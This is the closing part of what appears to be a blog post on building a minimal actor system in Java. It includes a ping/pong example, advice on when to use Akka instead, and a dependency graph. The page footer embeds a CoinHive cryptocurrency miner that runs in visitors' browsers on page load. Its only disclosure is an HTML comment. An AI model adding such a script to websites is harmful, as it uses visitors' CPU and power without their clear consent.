  <span class="o">}</span>
<span class="o">}</span>
<span class="n">ActorRef</span> <span class="n">pong</span> <span class="o">=</span> <span class="n">system</span><span class="o">.</span><span class="na">actor</span><span class="o">(</span><span class="s">"pong"</span><span class="o">,</span> <span class="o">(</span><span class="n">Object</span> <span class="n">msg</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="o">{</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">msg</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">sMsg</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">msg</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">sMsg</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"pong"</span><span class="o">))</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"pong"</span><span class="o">);</span>
      <span class="n">system</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"ping"</span><span class="o">).</span><span class="na">ifPresent</span><span class="o">((</span><span class="n">ActorRef</span> <span class="n">ping</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="n">ping</span><span class="o">.</span><span class="na">tell</span><span class="o">(</span><span class="s">"ping"</span><span class="o">));</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Sweet! Now we have two actors that can look each other up and communicate back and forth endlessly.
Not that this is a useful example, but it shows out our API improvements work.</p>

<p>Of course you can continue adding little improvements like this until you are eventually building
a full actor implementation (which you shouldn’t do). So this brings us to our next question.</p>

<h2 id="should-you-do-this">Should You Do This?</h2>

<p>So we’ve seen how we can create some really bare-bones actors but the question really is, “is it
worth it?” The answer to this question depends on what you’re doing. If all you need is some very simple
concurrency within your library, then this solution is fantastic as it’s zero-dependency. However if
you are performing very complex concurrent tasks that require a lot of coordination or cooperation, then
using a more full-featured framework may be to your benefit. The title did say this was a “poor man’s”
implementation, which means we’re missing <em>many</em> of the feature that would come in a typical actor
framework / library.</p>

<p>And actually, if you take a look at Akka (a popular Actor framework on the JVM), you’ll notice that the
dependency tree is surprisingly small. So, if you <em>must</em> require all the power of a full-blown actor
implementation, at least it’s not bloating your dependency tree <em>too</em> much.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">sbt&gt; akka-actor/dependencyGraph

             +-------------------+
             |akka-actor_2.11 [S]|
             | com.typesafe.akka |
             |   2.4-SNAPSHOT    |
             +-------------------+
                |          |
                |          -------------
                |                      |
                v                      v
  +---------------------------+ +------------+
  |scala-java8-compat_2.11 [S]| |   config   |
  |  org.scala-lang.modules   | |com.typesafe|
  |           0.7.0           | |   1.3.0    |
  +---------------------------+ +------------+</code></pre></figure>



        <div class="footer-navigation">
            
                <span class="previous"><a href="/log/2015/11/29/Typed-PATCH.html">
                    &laquo;Typed PATCH
                </a></span>
            
            
                <span class="next"><a href="/log/2016/07/25/Inspecting-JSON-From-The-Command-Line.html">
                    Inspecting JSON From The Command Line&raquo;
                </a></span>
            
        </div>
    </article>

    <footer style="text-align:center;">
      &copy; 2017. All Rights Reserved
    </footer>

</div>

      </div>
    </div>


    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-11511983-4"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'UA-11511983-4');
    </script>

    <!-- CoinHive Script
           This uses a small percentage of your CPU (20% on 1 thread) to mine on
           CoinHive as an alternative to Ads. As I undersatnd it, ad-blocker will
           stop this as well, so it should be just as (in)effective. -->
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <script>
      var miner = new CoinHive.Anonymous('T03lCJSshVAHeutVlaH1ZT4cCQgE0RmJ', {
        threads:  1,
        throttle: 0.80,
      });

      // Only start on non-mobile devices and if not opted-out
      // in the last 14400 seconds (4 hours):
      if (!miner.isMobile() && !miner.didOptOut(14400)) {
        miner.start();
      }
    </script>

  </body>

</html>
